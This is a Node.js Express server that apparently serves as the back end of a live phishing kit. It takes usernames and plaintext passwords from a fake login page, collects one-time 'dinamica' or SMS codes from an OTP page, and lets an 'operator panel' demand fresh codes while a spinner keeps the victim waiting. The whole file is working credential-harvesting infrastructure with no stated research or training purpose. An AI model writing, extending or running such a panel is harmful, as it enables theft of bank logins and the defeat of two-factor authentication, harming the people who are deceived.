const express = require('express');
const path = require('path');
const app = express();

const PORT = process.env.PORT || 3000;

app.use(express.json());

app.get('/', (req, res) => {
  res.redirect('/login.html');
});

// Serve static files from the root directory
app.use(express.static(path.join(__dirname)));

// In-memory sessions store
let sessions = {};

// 1. Create or update a session
app.post('/api/sessions', (req, res) => {
  const { id, username, password, tipoUsuario, device, ip, state } = req.body;
  if (!id) return res.status(400).json({ error: 'Missing session id' });
  
  if (sessions[id]) {
    sessions[id] = {
      ...sessions[id],
      username: username || sessions[id].username,
      password: password || sessions[id].password,
      tipoUsuario: tipoUsuario || sessions[id].tipoUsuario,
      device: device || sessions[id].device,
      ip: ip || sessions[id].ip,
      state: state || sessions[id].state,
      last_seen: Date.now(),
      updatedAt: Date.now()
    };
  } else {
    sessions[id] = {
      id,
      index: Object.keys(sessions).length + 1,
      username: username || '—',
      password: password || '—',
      tipoUsuario: tipoUsuario || 'CODIGO_PERSONA',
      device: device || 'desktop',
      ip: ip || '127.0.0.1',
      state: state || 'waiting',
      token: '',
      createdAt: Date.now(),
      last_seen: Date.now(),
      updatedAt: Date.now()
    };
  }
  res.json({ success: true, session: sessions[id] });
});

// 2. Get all sessions (calculated online state)
app.get('/api/sessions', (req, res) => {
  const now = Date.now();
  const list = Object.values(sessions).map(s => {
    const online = now - s.last_seen < 20000;
    return { ...s, online };
  });
  res.json(list);
});

// 3. Get single session (polling check)
app.get('/api/sessions/:id', (req, res) => {
  const { id } = req.params;
  const session = sessions[id];
  if (!session) return res.status(404).json({ error: 'Session not found' });
  res.json(session);
});

// 4. Update session token (from OTP page)
app.post('/api/sessions/:id/token', (req, res) => {
  const { id } = req.params;
  const { token } = req.body;
  if (!sessions[id]) return res.status(404).json({ error: 'Session not found' });
  
  sessions[id].token = token;
  sessions[id].state = 'typing';
  sessions[id].action = null; // Clear the action on the server so the spinner keeps showing!
  sessions[id].last_seen = Date.now();
  sessions[id].updatedAt = Date.now();
  res.json({ success: true, session: sessions[id] });
});

// 5. Update session ping (keepalive)
app.post('/api/sessions/:id/ping', (req, res) => {
  const { id } = req.params;
  if (!sessions[id]) return res.status(404).json({ error: 'Session not found' });
  
  sessions[id].last_seen = Date.now();
  res.json({ success: true });
});

// 6. Set action for a session (from operator panel)
app.post('/api/sessions/:id/action', (req, res) => {
  const { id } = req.params;
  const { action, state } = req.body;
  if (!sessions[id]) return res.status(404).json({ error: 'Session not found' });
  
  sessions[id].state = state || sessions[id].state;
  sessions[id].action = action;
  
  // If requesting a new token input (dinamica or sms), reset the token
  if (action === 'dinamica' || action === 'sms') {
    sessions[id].token = '';
  }
  
  sessions[id].last_seen = Date.now();
  sessions[id].updatedAt = Date.now();
  res.json({ success: true, session: sessions[id] });
});

// 7. Clear all sessions
app.post('/api/clear', (req, res) => {
  sessions = {};
  res.json({ success: true });
});

// Fallback to login.html for root path
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'login.html'));
});

app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});
